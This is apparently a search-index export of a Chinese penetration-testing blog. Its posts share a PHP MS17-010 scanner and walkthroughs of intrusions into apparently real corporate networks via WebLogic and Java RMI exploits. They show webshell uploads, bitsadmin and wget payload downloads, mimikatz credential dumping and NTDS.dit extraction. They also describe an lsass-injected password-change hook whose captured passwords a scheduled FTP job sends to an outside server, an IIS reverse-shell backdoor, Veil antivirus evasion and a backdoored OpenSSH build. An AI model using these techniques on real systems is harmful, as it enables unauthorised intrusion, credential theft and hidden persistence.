<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title><![CDATA[PHP版ms17-010]]></title>
    <url>%2F2018%2F05%2F28%2FPHP%E7%89%88ms17-010%2F</url>
    <content type="text"><![CDATA[这么晚了，还没回家。内网渗透扫描ms17-010脚本，比较方便快捷，无需其他插件。 代码1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768&lt;?php//根据巡风python代码翻译成PHP代码//2017.08.03 by ice &amp;&amp; By T00ls.Net；@error_reporting(7);if(@$_GET[&apos;host&apos;])&#123; $host=trim($_GET[&apos;host&apos;]); if(ms17010($host,445))&#123; echo &apos;&lt;span style=&quot;color:#F00&quot;&gt;[+] Vulnerability!&lt;/span&gt;&apos;; &#125;else&#123; echo &apos;&lt;span style=&quot;color:#000&quot;&gt;[-] No Vulnerability!&lt;/span&gt;&apos;; &#125; echo &apos;&lt;br&gt;[+] OS: &lt;span style=&quot;color:#666&quot;&gt;&apos;.smbos($host,445).&quot;&lt;/span&gt;&lt;br&gt;&quot;;&#125;function get_tree_connect_request($ip,$tree_id)&#123; $ipc=&apos;005c5c&apos;.bin2hex($ip).&apos;5c49504324003f3f3f3f3f00&apos;; $ipc_len_hex=bin2hex(pack(&apos;s&apos;,strlen($ipc)/2)); $data=&apos;ff534d4275000000001801280000000000000000000000000000729c&apos;.$tree_id.&apos;c4e104ff00000000000100&apos;.$ipc_len_hex.$ipc; $tree=&apos;000000&apos;.bin2hex(pack(&apos;s&apos;,strlen($data)/2)).$data; $data5=pack(&apos;H*&apos;,$tree); return $data5;&#125;function ms17010($host,$port)&#123; $tcp=&apos;tcp://&apos;.$host.&apos;:&apos;.$port; $sock=stream_socket_client($tcp,$errno, $errstr, 3,STREAM_CLIENT_CONNECT); if ($sock)&#123; $data1=pack(&apos;H*&apos;,&apos;00000054ff534d4272000000001801280000000000000000000000000000729c0000c4e1003100024c414e4d414e312e3000024c4d312e325830303200024e54204c414e4d414e20312e3000024e54204c4d20302e313200&apos;); fwrite($sock,$data1); fread($sock, 1024); $data2=pack(&apos;H*&apos;,&apos;0000008fff534d4273000000001801280000000000000000000000000000729c0000c4e10cff000000dfff0200010000000000310000000000d400008054004e544c4d5353500001000000050208a2010001002000000010001000210000002e3431426c7441314e505974624955473057696e646f7773203230303020323139350057696e646f7773203230303020352e3000&apos;); fwrite($sock,$data2); $data2_data=fread($sock, 1024); $user_id=substr(bin2hex($data2_data),64,4); $data3=pack(&apos;H*&apos;,&apos;00000150ff534d4273000000001801280000000000000000000000000000729c&apos;.$user_id.&apos;c4e10cff000000dfff0200010000000000f200000000005cd0008015014e544c4d53535000030000001800180040000000780078005800000002000200d000000000000000d200000020002000d200000000000000f2000000050208a2ec893eacfc70bba9afefe94ef78908d37597e0202fd6177c0dfa65ed233b731faf86b02110137dc50101000000000000004724eed7b8d2017597e0202fd6177c0000000002000a0056004b002d005000430001000a0056004b002d005000430004000a0056004b002d005000430003000a0056004b002d00500043000700080036494bf1d7b8d20100000000000000002e003400310042006c007400410031004e005000590074006200490055004700300057696e646f7773203230303020323139350057696e646f7773203230303020352e3000&apos;); fwrite($sock,$data3); fread($sock, 1024); $data4=pack(&apos;H*&apos;,&apos;00000063ff534d4273000000001801200000000000000000000000000000729c0000c4e10dff000000dfff02000100000000000000000000000000400000002600002e0057696e646f7773203230303020323139350057696e646f7773203230303020352e3000&apos;); fwrite($sock,$data4); $data4_data=fread($sock, 1024); $newuser_id=substr(bin2hex($data4_data),64,4); $data5=get_tree_connect_request($host,$newuser_id); fwrite($sock,$data5); fread($sock, 1024); $poc=pack(&apos;H*&apos;,&apos;0000004aff534d422500000000180128000000000000000000000000&apos;.$user_id.&apos;729c&apos;.$newuser_id.&apos;c4e11000000000ffffffff0000000000000000000000004a0000004a0002002300000007005c504950455c00&apos;); fwrite($sock,$poc); $poc_data=fread($sock, 1024); if(substr(bin2hex($poc_data),18,8) == &apos;050200c0&apos;)&#123; return true; &#125;else&#123; return false; &#125; &#125;&#125;function smbos($host,$port)&#123; $tcp=&apos;tcp://&apos;.$host.&apos;:&apos;.$port; $sock=stream_socket_client($tcp,$errno, $errstr, 3,STREAM_CLIENT_CONNECT); if ($sock)&#123; $payload1=pack(&apos;H*&apos;,&apos;00000085ff534d4272000000001853c80000000000000000000000000000fffe00000000006200025043204e4554574f524b2050524f4752414d20312e3000024c414e4d414e312e30000257696e646f777320666f7220576f726b67726f75707320332e316100024c4d312e325830303200024c414e4d414e322e3100024e54204c4d20302e313200&apos;); $payload2=pack(&apos;H*&apos;,&apos;0000010aff534d4273000000001807c80000000000000000000000000000fffe000040000cff000a01044132000000000000004a0000000000d40000a0cf00604806062b0601050502a03e303ca00e300c060a2b06010401823702020aa22a04284e544c4d5353500001000000078208a2000000000000000000000000000000000502ce0e0000000f00570069006e0064006f0077007300200053006500720076006500720020003200300030003300200033003700390030002000530065007200760069006300650020005000610063006b002000320000000000570069006e0064006f0077007300200053006500720076006500720020003200300030003300200035002e00320000000000&apos;); fwrite($sock,$payload1); $out1=fread($sock, 1024); fwrite($sock,$payload2); $out2=fread($sock, 1024); $blob_len_arr=unpack(&apos;s&apos;,substr($out2,36+7,2)); $osarr=explode(chr(0),iconv(&apos;UTF-16LE&apos;,&apos;UTF-8&apos;,substr($out2,36+11+$blob_len_arr[1]))); return $osarr[0].&apos;|&apos;.$osarr[1]; &#125;&#125;?&gt; 用法1http://xxx.xxx.xxx/ms17-010.php?host=IP]]></content>
      <categories>
        <category>系统漏洞</category>
      </categories>
      <tags>
        <tag>ms17-010</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[读取lsass.dmp报错]]></title>
    <url>%2F2018%2F05%2F23%2F%E8%AF%BB%E5%8F%96lsass-dmp%E6%96%87%E4%BB%B6%E6%8A%A5%E9%94%99%2F</url>
    <content type="text"><![CDATA[最近抓系统hash的时候，遇到了些问题。1目标机：windows 2003 X86 破解lsass.dmp首先利用procdump获取到lsass.dmp，运用mimikatz.exe解密该文件。注：32位就用32位的mimikatz破，同理64位的也是。123privilege::debugsekurlsa::minidump lsass.dmpsekurlsa::logonpasswords full 结果发现报错：1ERROR kuhl_m_sekurlsa_acquireLSA ; Minidump pInfos-&gt;MajorVersion (5) != MIMIKATZ_NT_MAJOR_VERSION (6) 查阅网上资料，原来破解lsass.dmp文件是需要系统内核版本一一对应的。比如在win03系统上获取到lsass.dmp文件要在win03下运行mimikatz破解，当然了在xp下运行mimikatz破解也是可以的，只要内核版本一样就行。 于是换了台机器成功破解lsass.dmp抓系统hash不限于该方法，从注册表里导出hash也是不错的选择。]]></content>
      <categories>
        <category>hash</category>
      </categories>
      <tags>
        <tag>hash</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[net view命令 6118报错]]></title>
    <url>%2F2018%2F05%2F15%2Fnet%20view%E5%91%BD%E4%BB%A4%206118%E6%8A%A5%E9%94%99%2F</url>
    <content type="text"><![CDATA[小记在一次测试中执行了net view /domain命令发现报错：12System error 6118 has occurred.The list of servers for this workgroup is not currently available 解决方法开启Browser服务12sc Browser config start=aotosc start Browser 执行完可能需要等几分钟才能执行net view命令]]></content>
      <categories>
        <category>系统命令</category>
      </categories>
      <tags>
        <tag>系统命令</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Weblogic引发的血案-3]]></title>
    <url>%2F2018%2F04%2F12%2FWeblogic%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88-3%2F</url>
    <content type="text"><![CDATA[无状态直接用WebLogic_Wls-Wsat_RCE_Exp.jarexp获取到shell，和上上篇文章一样。 信息收集123456hostname --&gt;BX1systeminfo --&gt;Windows Server 2012 R2 Standard 169补丁ipconfig --&gt;192.168.2.23 whoami &amp; net localgroup administrators --&gt;得知当前用户属于管理员组，同时不确定管理员组里帐号（kxadmin）是不是域管tasklist --&gt;WRSA.exe Webroot杀软(一开始没注意到这线程，以为没杀软，绕了点弯路)所属域 --&gt;Kx 攻击像开始说的，我是没有注意到WRSA.exe这款杀软，但是习惯性的用了Veil生成msf的exp，恰好又能过（virustotal.com）利用bitsadmin命令将exp上传到目标机1bitsadmin /transfer n http://xxx.xxx.xxx/xxx.exe C:\xxx\xxx.exe msf监听并反弹meterpreter的shell这里和 Weblogic引发的血案-2有点像，哈哈哈，入口点都一样。 域信息收集先收集一下域信息，找找域管，找找域控。123net group 查看组名net group &quot;domain admins&quot; /domain 查看域管理员nltest /dclist:kx 查看域控 12345678910111213141516C:\Oracle\Middleware\user_projects\domains\bifoundation_domain&gt;net group &quot;Domain Admins&quot; /domainnet group &quot;Domain Admins&quot; /domainThe request will be processed at a domain controller for domain Kx.Members-------------------------------------------------------------------------------xxxx Administrator xxxxkxadmin xxxx xxxxC:\Oracle\Middleware\user_projects\domains\bifoundation_domain&gt;nltest /dclist:Kxnltest /dclist:K2xGet list of DCs in domain &apos;Kx&apos; from &apos;\\AD1.Kx&apos;. AD1.Kx [PDC] [DS] Site: Default-First-Site-Name AD2.Kx [DS] Site: Default-First-Site-Name AD3.Kx [DS] Site: Default-First-Site-Name说明：xxxx代表的是马赛克 利用ping命令得到域控IP123AD1.Kx --&gt;192.168.2.225 域控AD2.Kx --&gt;192.168.2.215 域控AD3.Kx --&gt;192.168.2.245 域控 该机子的管理员组可能存在有域管账号，如果能抓出哈希岂不是美滋滋？但是当前权限不是NT AUTHORITY\SYSTEM所以msf加载的mimikatz是抓不出哈希的12345678C:\Oracle\Middleware\user_projects\domains\bifoundation_domain&gt;net localgroup administratorsMembers-------------------------------------------------------------------------------AdministratorKx\xxxxKx\xxxxKx\kxadmin（可能是域管账号）说明：这里不能说Administrator用户为域管，因为本机默认有个adminstrator,域控默认也有1个，但这两个并不是同一个。 提权啊 迷惑点综合上述，这里有个问题就是判断域管的时候留下的，就是执行net localgroup administrators显示有kx\kxadmin管理员用户，然后执行net group &quot;domain admins&quot; /domain查看域管当中也有kxadmin用户，这是kx\kxadmin迷惑了我（kx是域控），注意这个账号的格式是域控\账号，这里和远程登入域机器的时候输入域管账号一样，格式也是域控\账号。所以这里的kx\admin账号是域管的概率很大，因为它标识了。总的来说，验证的方法也很简单，就是读取kx\kxadmin的密码，能登入域控的话就是域管账号了。 提权失败好久没有提权了，记得上次用pr.exe提了台机子还是半年前的事。 Windows-Exploit-Suggester（提权辅助工具）在目标价执行systeminfo&gt;1.txt，然后将1.txt拖回本地1python windows-exploit-suggester.py --database 2018-04-10-mssb.xls --systeminfo 1.txt 这里只截取了一小部分的图，绿色代表可以利用的提权工具，参考文章 ms15-051运行ms15-051.exe结果懵逼了123456789101112131415C:\Oracle\Middleware\user_projects\domains\bifoundation_domain&gt;ms15-051.exe &quot;net user admin1 Qqaazz741/add&quot;ms15-051.exe &quot;net user admin1 Qqaazz741/add&quot;C:\Oracle\Middleware\user_projects\domains\bifoundation_domain&gt;dir Directory of C:\Oracle\Middleware\user_projects\domains\bifoundation_domain04/12/2018 06:43 AM &lt;DIR&gt; .04/12/2018 06:43 AM &lt;DIR&gt; ..11/10/2017 09:34 AM 144 edit.lok07/23/2016 08:17 PM 506 fileRealm.properties07/23/2016 08:17 PM &lt;DIR&gt; init-infoemmmmm运行完之后，提权工具没了？！ 当时第一反应就是被杀了，再一次看了进程才发现有个WRSA.exe杀软，好吧，第一次遇到，没注意。Webroot杀软手上也没有免杀的提权工具，这就很难受了。 meterpreter用msf自带的试试，search了几个15 16的提权模块，设置session之后 run！然而并没有用，meterpreter迁移进程和getsystem也不管用提权难啊提权难 内网游游还在为提权想办法时，扫内网发现了192.168.2.245域控存在ms17-010！这次你还不死。添加用户怼！ 远程登入迫不得已的时候才用这招，当时登入的时候还被挤下线了，好采对方没发觉什么。 mimiktaz不是明文的，cmd5可破。 Cobalt Strike利用该域控上线个cs然后arp登入一波域内机子就差不多完事了，但是死活上线不了，各种姿势都试过了，就是不给你上线，exp在进程里面了就是不给你上线（能通外网），刚开始以为是该域控环境有问题，所以就拿着域管登入到其他两个域控，还是不给上线，行吧，我在换多几台试试总可以了吧？换了不下十台机子，就是不给你上线，好气。最后以为是自己的Cobalt Strike有问题，本地运行下exp结果秒上线，狗噢。 MSF都说Cobalt Strike是msf的界面版，那我改用msf总行吧。添加msf路由，使得msf能访问到目标内网，参考文章登入域里的机器，使用到的模块1use exploit/windows/smb/psexec 设置对应的SMBDomain，SMBUer，SMBPass，run登入。结果三台域控没上线，只上线了两台，当时忘截图了，心累。 NTDS.dit文件获取NTDS.dit文件，导出域控里全部域用户哈希。导出方式参考文章1234567891011121314151617181920212223242526272829303132C:\Windows\System32&gt;vssadmin create shadow /for=c:vssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool(C) Copyright 2001-2013 Microsoft Corp.Successfully created shadow copy for &apos;c:\&apos; Shadow Copy ID: &#123;b1a1be28-c02a-4402-bf80-f82b46673b03&#125; Shadow Copy Volume Name: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4C:\Windows\System32&gt;vssadmin list shadowsvssadmin 1.1 - Volume Shadow Copy Service administrative command-line tool(C) Copyright 2001-2013 Microsoft Corp.Contents of shadow copy set ID: &#123;56512710-bc51-4ba7-98cc-4d1c5d7b75ae&#125; Contained 1 shadow copies at creation time: 4/12/2018 2:07:02 AM Shadow Copy ID: &#123;b1a1be28-c02a-4402-bf80-f82b46673b03&#125; Original Volume: (C:)\\?\Volume&#123;aececd34-32d8-4d4f-9dc6-184ea98a825f&#125;\ Shadow Copy Volume: \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4 Originating Machine: AD3.Kx Service Machine: AD3.Kx Provider: &apos;Microsoft Software Shadow Copy provider 1.0&apos; Type: ClientAccessible Attributes: Persistent, Client-accessible, No auto release, No writers, DifferentialC:\Windows\System32&gt;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\NTDS\NTDS.dit c:\ 1 file(s) copied.C:\Windows\System32&gt;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\system32\config\system c:\ 1 file(s) copied.C:\Windows\System32&gt;copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy4\windows\system32\config\sam c:\ 1 file(s) copied. 将NTDS.dit，system，sam 三个文件拖回kali里，DUMP NTDS.dit文件参考文章1python secretsdump.py -ntds /root/ntds_cracking/ntds.dit -system /root/ntds_cracking/SYSTEM LOCAL 说明：这里一定要在/root/下创建ntds_cracking目录然后将ntds.dit放到该目录，路径是/root/ntds_cracking/ntds.dit 不然会报错。这已经是第三章了，过不了多久会出第四第五章，也有可能第四章是终章，很多技术都没用到，比如MS14-068漏洞，假令牌，金票据，如何猥琐得到域管账号，从工作组到域渗透，很多很多，接下来的日子在慢慢写，当然了，这也是学习技术的过程。老规矩，擦屁股走人~]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>Weblogic漏洞</tag>
        <tag>后门</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Weblogic引发的血案-2]]></title>
    <url>%2F2018%2F04%2F03%2FWeblogic%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88-2%2F</url>
    <content type="text"><![CDATA[Somebody I can kiss，I want something just like this.直接用WebLogic_Wls-Wsat_RCE_Exp.jarexp获取到shell，和上一篇文章一样。 信息收集1234567hostname --&gt;OXXXsysteminfo --&gt;Windows Serverr 2008 Standard x64ipconfig --&gt;192.168.101.3whoami &amp; net localgroup administrators --&gt;得知当前用户不是管理员组tasklist --&gt;微软自带杀软 MsMpEng.exe 202个补丁所属域 --&gt;ALxxx无视xxx 攻击此杀软，用Veil免杀生成msf的exp就能过。利用bitsadmin命令将exp上传到目标机。1bitsadmin /transfer n http://xxx.xxx.xxx/xxx.exe C:\xxx\xxx.exe 运行exp，然后在msf上监听得到shellcs也来客串一下因为不是系统权限，所以尝试了getsystem命令提权，发现报错，mimikatz也抓不出哈希，于是就收集了域信息123net group 查看组名net group &quot;domain admins&quot; /domain 查看域管理员nltest /dclist:ALxxx 查看域控 123SRxx --&gt;192.168.101.1 域控SRxxx --&gt;192.168.101.8 域控GBxxx --&gt;192.168.121.1 域控 内网游游内网渗透的本质是收集信息 –某大牛现在已掌握的信息如下:12拿下了192.168.101.3（不完全控制，因为不是最高权限，也不打算往提权方面走，因为我懒）明确域管和域控 利用x.3机子作为代理机子，这里用到的是ew.exe，代理访问内网。 ms17-010似乎代理进内网第一件事情就是扫445端口了运气不错，发现域控192.168.101.8存在445漏洞，msf里的ms17-010的利用工具有四个，一个扫描漏洞，一个任意执行命令，两个反弹meterpreter的shell，这里只能用auxiliary/admin/smb/ms17_010_command这模块的，也就是任意执行命令想执行命令上传马儿的，但是powershell和bitsadmin命令执行完后各种报错上传不成功，也试过cs各种exp也弹不回来shell，于是添加管理员用户远程链接之上去后发现，原来机子不通外网，难怪之前的马儿回不来。。 mimikatz将域控里的管理员密码全部dump出来接下来可以拿着域管的账号登入到域里机子了，先尝试登入其他两个域控，运气不错，该域管也属于这两个域控的域控都是不通外网的，擦屁股溜了~]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>Weblogic漏洞</tag>
        <tag>后门</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Weblogic引发的血案]]></title>
    <url>%2F2018%2F03%2F29%2FWeblogic%E5%BC%95%E5%8F%91%E7%9A%84%E8%A1%80%E6%A1%88%2F</url>
    <content type="text"><![CDATA[珍惜每一刻。在某次测试中发现了某某站点开了7001端口的Weblogic服务，于是。。。 漏洞验证与利用运用payload向其写入shell 123456789root@kali:~/Desktop/Oracle-WebLogic-CVE-2017-10271-master# java -jar WebLogic_Wls-Wsat_RCE_Exp.jar http://xxx.xxx.xxx:7001 abc.jsp[*] Starting exploit...[*] Sending payloads...[*] Payloads sent...[*] Opening shell...[*] pwned! Go ahead...[+] http://xxx.xxx.xxx:7001/bea_wls_internal/abc.jsp?password=secfree&amp;command=whoami 这里请无视（xxx） 信息收集访问shell地址执行命令12345whoami --&gt;xxx\adminipconfig --&gt;公网地址sysinfo --&gt;win2008x64 R2 EN 工作组 257个补丁net localgroup administrators --&gt; 得知当前用户（admin）是管理组tasklist --&gt;杀软卡巴斯基（avp.exe） 执行netstat -ano看下端口，发现没有开启3389端口。但这不是绝对的，有些可爱的管理员会把3389端口改成别的端口，进行远程链接。所以要想知道真正的远程端口链接是多少需执行tasklist /svc命令，查看svchost.exe对应的TermService的pid1svchost.exe 3788 TermService 查看对应的PID，得知远程链接端口为39800 攻击1net user admin1 Qww123!/add&amp;net localgoup administrators admin1 /add 链接远程端口之！emmm什么时候冒出了一个熊猫卫士清理工具？？好吧。这杀软环境挺让人绝望的，光是卡巴就够呛还来个熊猫帮手较新版本的卡巴对lsass进程全面封锁，进程是动不了的，但幸运的是，该机子的卡巴是旧版本，而且病毒库也不更新，得利于管理员的懒惰，成功将它的lsass进程创建为转储文件lsass.DMP，并把它拖回本地dumpmimikatz获取到管理员密码 巩固都已经拿到管理员密码了，你还想怎样？没错，我不仅要拿你的密码，就算你修改新的密码，我也要知道！准备HookPasswordChange.dll和Invoke-ReflectivePEInjection.ps1文件，然后运行该powershell脚本将dll注入到lsass进程中。利用方法文章结束后有相关链接将准备好的文件丢进目标机子，执行命令1powershell –exec bypass –Command &quot;&amp; &#123;Import-Module &apos;C:\Invoke-ReflectivePEInjection.ps1&apos;;Invoke-ReflectivePEInjection -PEPath C:\HookPasswordChange.dll –procname lsass&#125;&quot; 成功安装，当管理员修改密码的时候会记录下新的密码，且以文本的形式保存在c:\windows\temp\passwords.txt因为管理员没有这么快改密码，所以自己就创建一个管理员用户，并修改密码做测试OK，没问题 传输实际过程中如果管理员修改了密码，我们是要将passwords.txt传送出来的。方法有很多，这里就用个简单的FTP上传文件的方式，将文件发送到FTP服务器将VBS脚本放到任务计划书里，按时执行，VBS代码如下12Set ws = CreateObject(&quot;Wscript.Shell&quot;)ws.run &quot;cmd /c ftp -s:E:\xxx\ftp.txt&quot;,vbhide ftp.txt内容为12345open xxx.xxx.xxx.xxxppp123456put c:\windows\temp\passwords.txtbye 继续忽略xxx但是，目标机子运行FTP xxx.xxx.xxx.xxx（xxx为FTP服务器的IP）报错：访问被拒绝可能是卡巴惹的祸吧，没有深究，自己上传个ftp.exe上去运行成功链接到FTP服务器在任务计划书里定时一天发送一次，搞定。 相关链接WebLogic Payload:https://github.com/iBearcat/Oracle-WebLogic-CVE-2017-10271HookPasswordChange:http://wooyun.jozxing.cc/static/drops/tips-13079.html溜了~]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>Weblogic漏洞</tag>
        <tag>后门</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iis6.x后门isapi测试]]></title>
    <url>%2F2018%2F03%2F26%2Fiis6.x%E5%90%8E%E9%97%A8isapi%E6%B5%8B%E8%AF%95%2F</url>
    <content type="text"><![CDATA[我就是爱吃醋，就是爱吃醋。访问网页，就弹shell？唔哟本地复现了一款micropoor大牛的后门，文章结束附上下载链接。 配置环境靶机环境：IP：192.11.22.88 win 2003 Enterprise 32位 iis6.x攻击机：IP：192.11.22.55 win 7打开internet信息服务（IIS）管理器找到默认网站右键点击属性，点击ISAPI筛选器添加iis_x86.dlldll文件。 攻击攻击机用nc监听端口，执行命令nc.exe -lvvp 80修改User agent内容，这里以谷歌浏览器为例，点击More tools然后选中Network conditions将User agent的内容改为：micropoor_iis:192.11.22.55:80 注：填本机IP然后访问网站，成功反弹shell 强大的后门！ 链接大牛博客：micropoor.blogspot.com32位dll下载：https://drive.google.com/file/d/1-dKhidlBXg3YZ144fejY8FPaYl2KX3Ot/view64位dll下载：https://drive.google.com/file/d/1M5hh2IQsnb_sJwIAkOHIJecarcp2FDhL/view下之前挂个代理，不然访问不到。]]></content>
      <categories>
        <category>后门</category>
      </categories>
      <tags>
        <tag>windows后门</tag>
        <tag>iis6.x</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Veil3.1免杀安装]]></title>
    <url>%2F2018%2F03%2F23%2FVeil3.1%E5%85%8D%E6%9D%80%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[听说很难安装。 准备工作下载最新3.1版本的VeilGithub：https://github.com/Veil-Framework/Veil.git 配置环境安装之前先更新一下包，执行命令apt-get update下载配置Veil所需的包，不然会报错，在终端输入：apt-get install libncurses5*apt-get install libavutil55*apt-get install gcc-mingw-w64*apt-get install wine32如果下载失败就挂个代理，应该没什么问题。这里要说的是红酒瓶wine，如果安装失败就使用如下三条命令：dpkg --add-architecture i386 apt-get update apt-get install wine32 输入命令wine --version查看是否安装成功。 安装解压Veil安装包unzip Veil-master.zip，cd到Veil-master/setup目录运行./setup.sh y回车安装需要点时间，喝杯水。 紧接着，一直疯狂的按next，让它安装。这里就不一一截图了。 看到这步点击finish了,然后继续安装。安装成功 运行在Veil-master文件夹下终端输入./Veil.py运行输入use 1然后 list查看payload这里测试生成个exeuse 5，然后输入IP地址和端口这里输入要生成的文件名生成成功 测试将生成的exe丢进win7运行，然后kali运行msf开启监听set payload windows/meterpreter/reverse_httpset lhost 192.11.22.64set lport 8888run成功反弹shell整个过程大致就这样，下次见。]]></content>
      <categories>
        <category>免杀</category>
      </categories>
      <tags>
        <tag>Veil</tag>
        <tag>免杀</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[OpenSSH后门的安装]]></title>
    <url>%2F2018%2F03%2F22%2FOpenSSH%E5%90%8E%E9%97%A8%E7%9A%84%E5%AE%89%E8%A3%85%2F</url>
    <content type="text"><![CDATA[本来想结合实战一起写出来的，但提权过程中出现了些问题，所以就单独写吧。本机环境：centos6.5 OpenSSH_5.3p1 准备工作下载openssh的安装包和后门安装包。安装包:http://www.openssh.com后门安装包:http://core.ipsecs.com/rootkit/patch-to-hack/0x06-openssh-5.9p1.patch.tar.gz 为了伪装在安装后门之前，先查看本机的ssh版本号ssh-V 解压安装包tar zxvf openssh-5.9p1.tar.gztar zxvf 0x06-openssh-5.9p1.patch.tar.gz 注入后门将后门文件夹的sshbd5.9p1.diff复制到openssh-5.9p1文件夹中，并在该openssh-5.9p1文件夹执行patch &lt;sshbd5.9p1.diff命令 修改版本号和后门密码在openssh-5.9p1文件夹中执行vim version.h修改版本号（为了伪装，这里修改成一开始记下来的版本号），修改后门密码和记录密码的保存路径vim includes.hilog是记录别的机子登录本机的密码olon是记录本机登录到别的机子的密码（这应该能理解吧） 安装在安装之前先安装配置环境，不然会报错。yum install -y openssl openssl-devel pam-develyum install zlib-develyum install gccyum install opensslyum install openssl-devel 安装及编译：./configure --prefix=/usr --sysconfdir=/etc/ssh --with-pam --with-kerberos5 显示到这个说明编译成功，然后执行make和make install命令安装执行命令sevice ssh restart重启ssh 测试后门kali链接ssh查看登录过来的ssh密码cat /tmp/ilog还是明文的OK!大功告成 特别注意的是，整个过程都是在root用户下执行的，不然没有权限执行。]]></content>
      <categories>
        <category>后门</category>
      </categories>
      <tags>
        <tag>liunx后门</tag>
        <tag>OpenSSH</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[JAVARMI漏洞之旅]]></title>
    <url>%2F2018%2F03%2F17%2FJAVARMI%E6%BC%8F%E6%B4%9E%E4%B9%8B%E6%97%85%2F</url>
    <content type="text"><![CDATA[博客刚搭建不久，有些美工还没做。##其实我不想在搞了，搭建个博客麻烦得要死。今天周末天气不错，兜兜转转也不懂要做什么。最近在研究RMI反序列化漏洞，就写一片文章吧。 突破口在一次nmap扫描过程中发现了目标机子8100端口存在java RMI服务于是用attackRMI.jar链接该端口，成功回显系统信息 执行cat /proc/version id 命令 写马失败Liunx的版本号比较低，User权限，ifconfig：10.xx.xx.13内网机子，对系统的基本信息了解之后，接下来就尝试着echo写一句话到web路径下（用菜刀连接，方便操作，因为使用attackRMI.jar只能在当前目录下操作，不能cd到别的目录），echo 一句话&gt;&gt;/xxx/xxx/tomcat/webapps/root/xxx.jsp（web路径疯狂ls才找到的） 运行完之后发现文件是创建了，但是字节为0 经过一番尝试之后发现echo命令用不了。 不能写内容到文件里去，于是想到了wget命令，wget http://xxx.xxx.xxx/xxx.jsp -O /xxx/xxx/tomcat/webapps/root/xxx.jsp（其中肉鸡的地址是http 马名字为xxx.jsp），运行后发现并没有成功写入到文件，排查原因发现该机子根本就不通外网。内网机子做了端口映射。 马儿出不了，那就翻翻有啥利用的东西。在经过疯狂的ls之后找到了几个数据库密码： 转机既然突破不了，为何不去扫扫C段？果然在其同网段的一台机子的8800端口发现了同样的漏洞：说干就干，运气不错，系统权限windows 2008 32位 没有域 netstat -ano对方开了3389添加用户net user admln admin /add &amp; net localgoup administrators admln /add成功添加用户之后用mstsc命令远程链接发现报错：原来该机子没有把自己的3389端口映射出来，不好的情况发生了，这台和之前的一样不能通外网，正当想办法的时候，小伙伴在该C段拿下了台liunx的机子，通过端口漏洞jdwp，过程大致说下，该漏洞是远程执行命令的，然后通过执行命令找到web服务的根路径，向其写入一句话。乌云有篇关于jdwp的文章，有兴趣的去看下。 内网游游在已拿下的liunx机子上安装了reGeorg代理，然后通过代理远程链接之前的win 08机子 用到mimikatz获取管理员的哈希及明文密码 之前写马失败的那台，通过wget到内网机子里获取到一句话,也成功拿下了。 内网很大，这里就不继续写下去了。 刮好大的风啊，准备要下雨了，走人走人。]]></content>
      <categories>
        <category>web安全</category>
      </categories>
      <tags>
        <tag>RMI漏洞</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
</search>
